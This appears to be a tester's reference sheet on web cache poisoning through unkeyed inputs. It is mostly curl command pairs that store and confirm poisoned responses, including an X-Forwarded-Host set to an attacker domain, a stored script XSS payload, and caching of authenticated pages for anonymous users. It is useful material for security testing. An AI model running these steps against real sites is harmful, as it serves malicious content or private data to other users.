# Unkeyed deep — the unkeyed-input mechanics, exhaustively

How an unkeyed input poisons the shared copy — the mechanism.

---

## 1. The unkeyed input — the poisoning vector

```text
the vulnerability's precondition: a request part the app READS
(reflects, redirects on, personalizes on) but the cache key IGNORES.
the stored copy carries the unkeyed input's effect — every requester's
copy serves it.
```

## 2. The mechanism — the two-request store+serve

```text
request 1 — the poison request: send the unkeyed input → the origin
            reflects it → the cache stores the response under the key
request 2 — the serve request: a clean request for the same key →
            the cache serves the stored copy → the stored copy carries
            YOUR input → the deception
```

## 3. The reflected-header shape — the classic vector

```bash
# an unkeyed reflected header — YOUR header's effect is stored
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # stores it
curl "$BASE/page?cb=<unique>"   # a clean request — <marker> reflected? → poisoned
```

## 4. The URL-rewrite shape — the host-rewrite

```bash
# an unkeyed X-Forwarded-Host — the app's links use YOUR host
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>" | grep 'attacker.com'   # the stored copy's links carry it
```

```text
the stored copy's links/scripts point to YOUR domain — every
requester's fetch hits you — a URL-rewrite deception.
```

## 5. The charset-injection shape — the verified card's shape

```bash
# an unkeyed reflected charset — an injected charset XSS stored
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # the stored copy carries it
```

## 6. The reflected-payload shape — a stored XSS

```bash
# a reflected payload — a JS, a redirect — the stored copy carries it
curl "$BASE/page?cb=<unique>" -H 'User-Agent: <script>alert(1)</script>'
curl "$BASE/page?cb=<unique>" | grep '<script>'   # the stored copy carries the XSS
```

## 7. The param shape — an unkeyed param

```bash
# an unkeyed param — the app reflects, the cache ignores
curl "$BASE/page?cb=<unique>&utm=<payload>"   # stored under /page?cb=<unique>
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # <payload> reflected? → poisoned
```

## 8. The cookie shape — an unkeyed cookie

```bash
# an unkeyed cookie — the app reads, the cache ignores
curl "$BASE/page?cb=<unique>" -H 'Cookie: theme=<payload>'
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # <payload> reflected? → poisoned
```

## 9. The path shape — a normalization boundary

```bash
# a path the cache and the app normalize differently
curl "$BASE/static/../admin?cb=<unique>"   # the cache stores it under the static key
curl "$BASE/static/../admin?cb=<unique>"   # the stored copy's response is the app's
```

## 10. The auth-state shape — the deception

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'   # stores the privileged copy
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # the privileged page → deception
```

## 11. The unkeyed-input check — send it and confirm the store

```bash
# for each candidate input — send it → check the stored copy
for h in 'X-Forwarded-Host' 'X-Original-URL' 'User-Agent' 'Referer' 'Accept-Language' 'Accept-Charset' 'X-Forwarded-Scheme'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## 12. The unkeyed-input falsifier — a keyed input

```text
a keyed input → a per-input entry → YOUR input's effect is in YOUR
copy only → the clean request doesn't reflect → a different class.
```

## 13. The unkeyed-input falsifier — a MISS reflection

```text
a marker reflected on a MISS → the response came from the origin —
a REFLECTION, not a poisoning — the stored copy didn't serve it.
```

## 14. The unkeyed-input falsifier — a no-cache surface

```text
no front-end cache → no stored copy → a different class.
a Cache-Control: no-store/private → the page isn't cached → a
different class.
```
